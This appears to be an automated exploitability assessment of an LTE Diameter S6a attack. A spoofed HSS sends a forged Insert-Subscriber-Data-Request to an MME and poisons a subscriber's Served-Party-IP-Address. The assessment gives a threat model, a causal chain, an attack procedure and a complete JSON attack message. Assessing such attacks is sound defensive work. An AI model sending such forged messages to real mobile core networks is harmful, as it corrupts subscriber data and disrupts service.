@@ -1,0 +1,115 @@
+### **Threat Model:**
+- **Attack Assumption:**
+  - On S6a, the normal sender of an `Insert-Subscriber-Data-Request` is the **HSS** and the victim receiver is the **MME**. We assume the MME is misconfigured so an Internet attacker can impersonate the HSS, open a Diameter connection to the MME, and send forged IDRs that the MME accepts as valid subscriber-data updates.
+
+- **Attacker Capability:**
+  - The attacker can actively send crafted `Insert-Subscriber-Data-Request` messages on its own Diameter connection and receive the corresponding answers. The attacker knows the target subscriber identity needed for `User-Name`, but cannot observe or alter legitimate HSS<->MME traffic and has no extra NAS/GTP/PGW control beyond what follows from the MME accepting the forged S6a request.
+
+### **Exploitability Analysis:**
+- `Subscription-Data.APN-Configuration-Profile.APN-Configuration.Served-Party-IP-Address` is a 3GPP vendor-specific **Address** AVP carried as authoritative HSS provisioning inside the subscriber's APN profile. It is not mere metadata about the sender; it is subscriber state that the MME stores under a specific `APN-Configuration`, typically keyed by `Context-Identifier` and associated `Service-Selection`.
+
+- Under the threat model, changing this field can poison the MME's cached APN subscription state for the targeted subscriber by replacing the APN-specific provisioned IP address with an attacker-chosen IPv4 or IPv6 value. The field is optional, but when present it has provisioning semantics: it tells the MME that this APN context is associated with that served-party address.
+
+- The field-specific causal chain is:
+  1. The attacker sends a forged IDR from the spoofed HSS role to the MME.
+  2. Inside `Subscription-Data`, the attacker includes an `APN-Configuration-Profile` entry for the victim subscriber and sets `Served-Party-IP-Address` in the chosen `APN-Configuration`.
+  3. The MME updates/stores that APN subscription entry as HSS-authoritative profile data.
+  4. On a later attach or PDN Connectivity procedure for that APN, the MME reuses the poisoned APN configuration when handling PDN establishment logic.
+  5. If the provisioned address is inconsistent with `PDN-Type`, stale, unauthorized, or conflicts with PGW-side policy, the resulting session setup can fail or behave incorrectly for that APN.
+
+- This is a real **field-specific** control effect because the negative outcome depends on the value of this leaf AVP itself: the MME's stored subscriber APN profile is changed in an address-specific way. The most credible impact is **subscriber data corruption leading to later PDN/bearer establishment mismatch or failure** for the affected APN.
+
+- The impact is narrower than changing APN selection or QoS AVPs, and successful realization of a wrong static IP assignment may still depend on PGW behavior. But the evidence supports a concrete exploit path even without PGW compromise: poisoning this field can leave the MME with inconsistent APN address state that is later consumed during session handling, producing service disruption for that subscriber. That is enough for field-specific exploitability under the stated rules.
+
+- The effect is usually not immediate at IDR receipt; it is typically realized on a later PDN establishment or related reevaluation. The poisoned value is persistent within the UE's MME subscriber context until overwritten by a later legitimate IDR, a fresh subscription download, or context teardown/re-registration.
+
+### **Attack Procedure:**
+- Craft a forged `Insert-Subscriber-Data-Request` on S6a from the spoofed HSS identity to the target MME, using the victim subscriber's `User-Name`.
+- Include `Subscription-Data` -> `APN-Configuration-Profile` -> one `APN-Configuration` with:
+  - `Context-Identifier`
+  - `Service-Selection`
+  - `PDN-Type`
+  - `Served-Party-IP-Address` set to a malicious or inconsistent static IP value
+- The goal is to make the MME store the modified APN profile entry for that subscriber.
+- Expected success condition: the MME accepts the IDR, and the subscriber later experiences failed or altered PDN establishment for the targeted APN due to the poisoned served-party IP address.
+
+### **Attack Message:**
+```json
+{
+  "diameter_header": {
+    "version": 1,
+    "flags": ["R", "P"],
+    "command_code": 319,
+    "application_id": 16777251
+  },
+  "avps": [
+    {
+      "name": "Session-Id",
+      "value": "attacker-hss.example.net;1729382251;1"
+    },
+    {
+      "name": "Origin-Host",
+      "value": "hss.attacker.example.net"
+    },
+    {
+      "name": "Origin-Realm",
+      "value": "example.net"
+    },
+    {
+      "name": "Destination-Host",
+      "value": "mme01.epc.example.com"
+    },
+    {
+      "name": "Destination-Realm",
+      "value": "epc.example.com"
+    },
+    {
+      "name": "Auth-Session-State",
+      "value": 1
+    },
+    {
+      "name": "User-Name",
+      "value": "001010123456789"
+    },
+    {
+      "name": "Vendor-Specific-Application-Id",
+      "value": {
+        "Vendor-Id": 10415,
+        "Auth-Application-Id": 16777251
+      }
+    },
+    {
+      "name": "Subscription-Data",
+      "vendor_id": 10415,
+      "value": {
+        "APN-Configuration-Profile": {
+          "Context-Identifier": 1,
+          "APN-Configuration": [
+            {
+              "Context-Identifier": 1,
+              "Service-Selection": "internet",
+              "PDN-Type": "IPv4",
+              "Served-Party-IP-Address": "1.1.1.1",
+              "EPS-Subscribed-QoS-Profile": {
+                "QoS-Class-Identifier": 9,
+                "Allocation-Retention-Priority": {
+                  "Priority-Level": 15,
+                  "Pre-emption-Capability": 1,
+                  "Pre-emption-Vulnerability": 0
+                }
+              },
+              "AMBR": {
+                "Max-Requested-Bandwidth-UL": 1000000,
+                "Max-Requested-Bandwidth-DL": 1000000
+              }
+            }
+          ]
+        }
+      }
+    }
+  ]
+}
+```
+
+### **Classification:**
+EXPLOITABLE
